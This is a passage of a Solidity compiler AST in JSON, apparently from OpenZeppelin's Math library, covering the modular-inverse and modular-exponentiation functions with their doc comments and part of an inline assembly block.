Requested":false,"leftHandSide":{"components":[{"id":2773,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2745,"src":"13987:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},{"id":2774,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2749,"src":"13990:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":2775,"isConstant":false,"isInlineArray":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"TupleExpression","src":"13986:6:6","typeDescriptions":{"typeIdentifier":"t_tuple$_t_int256_$_t_int256_$","typeString":"tuple(int256,int256)"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"components":[{"id":2776,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2749,"src":"14072:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":2784,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2777,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2745,"src":"14326:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":2783,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2778,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2749,"src":"14330:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"id":2781,"name":"quotient","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2756,"src":"14341:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2780,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14334:6:6","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":2779,"name":"int256","nodeType":"ElementaryTypeName","src":"14334:6:6","typeDescriptions":{}}},"id":2782,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14334:16:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"14330:20:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"14326:24:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":2785,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"13995:373:6","typeDescriptions":{"typeIdentifier":"t_tuple$_t_int256_$_t_int256_$","typeString":"tuple(int256,int256)"}},"src":"13986:382:6","typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2787,"nodeType":"ExpressionStatement","src":"13986:382:6"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2754,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2752,"name":"remainder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2735,"src":"13485:9:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"hexValue":"30","id":2753,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13498:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"13485:14:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2789,"nodeType":"WhileStatement","src":"13478:905:6"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2792,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2790,"name":"gcd","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2741,"src":"14401:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"hexValue":"31","id":2791,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14408:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"14401:8:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2795,"nodeType":"IfStatement","src":"14397:22:6","trueBody":{"expression":{"hexValue":"30","id":2793,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14418:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"functionReturnParameters":2727,"id":2794,"nodeType":"Return","src":"14411:8:6"}},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":2799,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2797,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2745,"src":"14470:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"hexValue":"30","id":2798,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14474:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"14470:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2806,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2800,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2723,"src":"14477:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"arguments":[{"id":2804,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"-","prefix":true,"src":"14489:2:6","subExpression":{"id":2803,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2745,"src":"14490:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":2802,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14481:7:6","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":2801,"name":"uint256","nodeType":"ElementaryTypeName","src":"14481:7:6","typeDescriptions":{}}},"id":2805,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14481:11:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"14477:15:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"arguments":[{"id":2809,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2745,"src":"14502:1:6","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":2808,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14494:7:6","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":2807,"name":"uint256","nodeType":"ElementaryTypeName","src":"14494:7:6","typeDescriptions":{}}},"id":2810,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14494:10:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2796,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2354,"src":"14462:7:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (bool,uint256,uint256) pure returns (uint256)"}},"id":2811,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14462:43:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2727,"id":2812,"nodeType":"Return","src":"14455:50:6"}]}]},"documentation":{"id":2719,"nodeType":"StructuredDocumentation","src":"12082:553:6","text":" @dev Calculate the modular multiplicative inverse of a number in Z/nZ.\n If n is a prime, then Z/nZ is a field. In that case all elements are inversible, except 0.\n If n is not a prime, then Z/nZ is not a field, and some elements might not be inversible.\n If the input value is not inversible, 0 is returned.\n NOTE: If you know for sure that n is (big) a prime, it may be cheaper to use Fermat's little theorem and get the\n inverse using `Math.modExp(a, n - 2, n)`. See {invModPrime}."},"id":2815,"implemented":true,"kind":"function","modifiers":[],"name":"invMod","nameLocation":"12649:6:6","nodeType":"FunctionDefinition","parameters":{"id":2724,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2721,"mutability":"mutable","name":"a","nameLocation":"12664:1:6","nodeType":"VariableDeclaration","scope":2815,"src":"12656:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2720,"name":"uint256","nodeType":"ElementaryTypeName","src":"12656:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2723,"mutability":"mutable","name":"n","nameLocation":"12675:1:6","nodeType":"VariableDeclaration","scope":2815,"src":"12667:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2722,"name":"uint256","nodeType":"ElementaryTypeName","src":"12667:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12655:22:6"},"returnParameters":{"id":2727,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2726,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2815,"src":"12701:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2725,"name":"uint256","nodeType":"ElementaryTypeName","src":"12701:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12700:9:6"},"scope":3686,"src":"12640:1919:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2835,"nodeType":"Block","src":"15159:82:6","statements":[{"id":2834,"nodeType":"UncheckedBlock","src":"15169:66:6","statements":[{"expression":{"arguments":[{"id":2827,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2818,"src":"15212:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2830,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2828,"name":"p","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2820,"src":"15215:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"hexValue":"32","id":2829,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15219:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"15215:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2831,"name":"p","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2820,"src":"15222:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2825,"name":"Math","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3686,"src":"15200:4:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Math_$3686_$","typeString":"type(library Math)"}},"id":2826,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"15205:6:6","memberName":"modExp","nodeType":"MemberAccess","referencedDeclaration":2872,"src":"15200:11:6","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256,uint256,uint256) view returns (uint256)"}},"id":2832,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15200:24:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2824,"id":2833,"nodeType":"Return","src":"15193:31:6"}]}]},"documentation":{"id":2816,"nodeType":"StructuredDocumentation","src":"14565:514:6","text":" @dev Variant of {invMod}. More efficient, but only works if `p` is known to be a prime greater than `2`.\n From https://en.wikipedia.org/wiki/Fermat%27s_little_theorem[Fermat's little theorem], we know that if p is\n prime, then `a**(p-1) ≡ 1 mod p`. As a consequence, we have `a * a**(p-2) ≡ 1 mod p`, which means that\n `a**(p-2)` is the modular multiplicative inverse of a in Fp.\n NOTE: this function does NOT check that `p` is a prime greater than `2`."},"id":2836,"implemented":true,"kind":"function","modifiers":[],"name":"invModPrime","nameLocation":"15093:11:6","nodeType":"FunctionDefinition","parameters":{"id":2821,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2818,"mutability":"mutable","name":"a","nameLocation":"15113:1:6","nodeType":"VariableDeclaration","scope":2836,"src":"15105:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2817,"name":"uint256","nodeType":"ElementaryTypeName","src":"15105:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2820,"mutability":"mutable","name":"p","nameLocation":"15124:1:6","nodeType":"VariableDeclaration","scope":2836,"src":"15116:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2819,"name":"uint256","nodeType":"ElementaryTypeName","src":"15116:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"15104:22:6"},"returnParameters":{"id":2824,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2823,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2836,"src":"15150:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2822,"name":"uint256","nodeType":"ElementaryTypeName","src":"15150:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"15149:9:6"},"scope":3686,"src":"15084:157:6","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":2871,"nodeType":"Block","src":"16011:174:6","statements":[{"assignments":[2849,2851],"declarations":[{"constant":false,"id":2849,"mutability":"mutable","name":"success","nameLocation":"16027:7:6","nodeType":"VariableDeclaration","scope":2871,"src":"16022:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2848,"name":"bool","nodeType":"ElementaryTypeName","src":"16022:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2851,"mutability":"mutable","name":"result","nameLocation":"16044:6:6","nodeType":"VariableDeclaration","scope":2871,"src":"16036:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2850,"name":"uint256","nodeType":"ElementaryTypeName","src":"16036:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2857,"initialValue":{"arguments":[{"id":2853,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2839,"src":"16064:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2854,"name":"e","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2841,"src":"16067:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2855,"name":"m","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2843,"src":"16070:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2852,"name":"tryModExp","nodeType":"Identifier","overloadedDeclarations":[2896,2978],"referencedDeclaration":2896,"src":"16054:9:6","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (uint256,uint256,uint256) view returns (bool,uint256)"}},"id":2856,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16054:18:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"16021:51:6"},{"condition":{"id":2859,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"16086:8:6","subExpression":{"id":2858,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2849,"src":"16087:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2868,"nodeType":"IfStatement","src":"16082:74:6","trueBody":{"id":2867,"nodeType":"Block","src":"16096:60:6","statements":[{"expression":{"arguments":[{"expression":{"id":2863,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"16122:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2864,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"16128:16:6","memberName":"DIVISION_BY_ZERO","nodeType":"MemberAccess","referencedDeclaration":196,"src":"16122:22:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2860,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"16110:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2862,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"16116:5:6","memberName":"panic","nodeType":"MemberAccess","referencedDeclaration":228,"src":"16110:11:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$__$","typeString":"function (uint256) pure"}},"id":2865,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16110:35:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2866,"nodeType":"ExpressionStatement","src":"16110:35:6"}]}},{"expression":{"id":2869,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2851,"src":"16172:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2847,"id":2870,"nodeType":"Return","src":"16165:13:6"}]},"documentation":{"id":2837,"nodeType":"StructuredDocumentation","src":"15247:678:6","text":" @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m)\n Requirements:\n - modulus can't be zero\n - underlying staticcall to precompile must succeed\n IMPORTANT: The result is only valid if the underlying call succeeds. When using this function, make\n sure the chain you're using it on supports the precompiled contract for modular exponentiation\n at address 0x05 as specified in https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise,\n the underlying function will succeed given the lack of a revert, but the result may be incorrectly\n interpreted as 0."},"id":2872,"implemented":true,"kind":"function","modifiers":[],"name":"modExp","nameLocation":"15939:6:6","nodeType":"FunctionDefinition","parameters":{"id":2844,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2839,"mutability":"mutable","name":"b","nameLocation":"15954:1:6","nodeType":"VariableDeclaration","scope":2872,"src":"15946:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2838,"name":"uint256","nodeType":"ElementaryTypeName","src":"15946:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2841,"mutability":"mutable","name":"e","nameLocation":"15965:1:6","nodeType":"VariableDeclaration","scope":2872,"src":"15957:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2840,"name":"uint256","nodeType":"ElementaryTypeName","src":"15957:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2843,"mutability":"mutable","name":"m","nameLocation":"15976:1:6","nodeType":"VariableDeclaration","scope":2872,"src":"15968:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2842,"name":"uint256","nodeType":"ElementaryTypeName","src":"15968:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"15945:33:6"},"returnParameters":{"id":2847,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2846,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2872,"src":"16002:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2845,"name":"uint256","nodeType":"ElementaryTypeName","src":"16002:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"16001:9:6"},"scope":3686,"src":"15930:255:6","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":2895,"nodeType":"Block","src":"17039:1493:6","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2888,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2886,"name":"m","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2879,"src":"17053:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":2887,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17058:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"17053:6:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2893,"nodeType":"IfStatement","src":"17049:29:6","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":2889,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"17069:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"hexValue":"30","id":2890,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"17076:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"id":2891,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"17068:10:6","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_rational_0_by_1_$","typeString":"tuple(bool,int_const 0)"}},"functionReturnParameters":2885,"id":2892,"nodeType":"Return","src":"17061:17:6"}},{"AST":{"nativeSrc":"17113:1413:6","nodeType":"YulBlock","src":"17113:1413:6","statements":[{"nativeSrc":"17127:22:6","nodeType":"YulVariableDeclaration","src":"17127:22:6","value":{"arguments":[{"kind":"number","nativeSrc":"17144:4:6","nodeType":"YulLiteral","src":"17144:4:6","type":"","value":"0x40"}],"functionName":{"name":"mload","nativeSrc":"17138:5:6","nodeType":"YulIdentifier","src":"17138:5:6"},"nativeSrc":"17138:11:6","nodeType":"YulFunctionCall","src":"17138:11:6"},"variables":[{"name":"ptr","nativeSrc":"17131:3:6","nodeType":"YulTypedName","src":"17131:3:6","type":""}]},{"expression":{"arguments":[{"name":"ptr","nativeSrc":"18057:3:6","nodeType":"YulIdentifier","src":"18057:3:6"},{"kind":"number","nativeSrc":"18062:4:6","nodeType":"YulLiteral","src":"18062:4:6","type":"","value":"0x20"}],"functionName":{"name":"mstore","nativeSrc":"18050:6:6","nodeType":"YulIdentifier","src":"18050:6:6"},"nativeSrc":"18050:17:6","nodeType":"YulFunctionCall","src":"18050:17:6"},"nativeSrc":"18050:17:6","nodeType":"YulExpressionStatement","src":"18050:17:6"},{"expression":{"arguments":[{"arguments":[{"name":"ptr","nativeSrc":"18091:3:6","nodeType":"YulIdentifier","src":"18091:3:6"},{"kind":"number","nativeSrc":"18096:4:6","nodeType":"YulLiteral","src":"18096:4:6","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"18087:3:6","nodeType":"YulIdentifier","src":"18087:3:6"},"nativeSrc":"18087:14:6","nodeType":"YulFunctionCall","src":"18087:14:6"},{"kind":"number","nativeSrc":"18103:4:6","nodeType":"YulLiteral","src":"18103:4:6","type":"","value":"0x20"}],"functionName":{"name":"mstore","nativeSrc":"18080:6:6","nodeType":"YulIdentifier","src":"18080:6:6"},"nativeSrc":"18080:28:6","nodeType":"YulFunctionCall","src":"18080:28:6"},"nativeSrc":"18080:28:6","nodeType":"YulExpressionStatement","src":"18080:28:6"},{"expression":{"arguments":[{"arguments":[{"name":"ptr","nativeSrc":"18132:3:6","nodeType":"YulIdentifier","src":"18132:3:6"},{"kind":"number","nativeSrc":"18137:4:6","nodeType":"YulLiteral","src":"18137:4:6","type":"","value":"0x40"}],"functionName":{"name":"add","nativeSrc":"18128:3:6","nodeType":"YulIdentifier","src":"18128:3:6"},"nativeSrc":"18128:14:6","nodeType":"YulFunctionCall","src":"18128:14:6"},{"kind":"number","nativeSrc":"18144:4:6","nodeType":"YulLiteral","src":"18144:4:6","type":"","value":"0x20"}],"functionName":{"name":"mstore","nativeSrc":"18121:6:6","nodeType":"YulIdentifier","src":"18121:6:6"},"nativeSrc":"18121:28:6","nodeType":"YulFunctionCall","src":"18121:28:6"},"nativeSrc":"18121:28:6","nodeType":"YulExpressionStatement","src":"18121:28:6"},{"expression":{"arguments":[{"arguments":[{"name":"ptr","nativeSrc":"18173:3:6","nodeType":"YulIdentifier","src":"18173:3:6"},{"kind":"number","nativeSrc":"18178:4:6","nodeType":"YulLiteral","src":"18178:4:6","type":"","value":"0x60"}],"functionName":{"name":"add","nativeSrc":"18169:3:6","nodeType":"YulIdentifier","src":"18169:3:6"},"nativeSrc":"18169:14:6","nodeType":"YulFunctionCall","src":"18169:14:6"},{"name":"b","nativeSrc":"18185:1:6","nodeType":"YulIdentifier","src":"18185:1:6"}],"functionName":{"name":"mstore","nativeSrc":"18162:6:6","nodeType":"YulIdentifier","src":"18162:6:6"},"nativeSrc":"18162:25:6","nodeType":"YulFunctionCall","src":"18162:25:6"},"nativeSrc":"18162:25:6","nodeType":"YulExpressionStatement","src":"18162:25:6"},{"expression":{"arguments":[{"arguments":[{"name":"ptr","nativeSrc":"18211:3:6","nodeType":"YulIdentifier","src":"18211:3:6"},{"kind":"number","nativeSrc":"18216:4:6","nodeType":"YulLiteral","src":"18216:4:6","type":"","value":"0x80"}],"functionName":{"name":"add","nativeSrc":"18207:3:6","nodeType":"YulIdentifier","src":"18207:3:6"},"nativeSrc":"18207:14:6","nodeType":"YulFunctionCall","src":"18207:14:6"},{"name":"e","nativeSrc":"18223:1:6","nodeType":"YulIdentifier","src":"18223:1:6"}],"functionName":{"name":"mstore","nativeSrc":"18200:6:6","nodeType":"YulIdentifier","src":"18200:6:6"},"nativeSrc":"18200:25:6","nodeType":"YulFunctionCall","src":"18200:25:6"},"nativeSrc":"18200:25:6","nodeType":"YulExpressionStatement","src":"18200:25:6"},{"expression":{"arguments":[{"arguments":[{"name":"p